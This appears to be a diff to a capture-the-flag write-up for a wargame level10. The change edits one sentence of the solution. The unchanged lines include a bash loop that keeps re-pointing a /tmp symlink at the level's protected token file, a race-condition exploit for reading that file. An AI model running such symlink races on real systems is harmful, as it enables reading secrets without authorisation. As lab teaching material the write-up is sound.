@@ -76,7 +76,7 @@ Theorical steps:
 
 # Solution
 
-Level10 seems to be able to sends any file we create so on a first terminal connected with ssh let's create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
+On a first terminal connected with ssh let's create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
 ```bash
 while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done
 ```
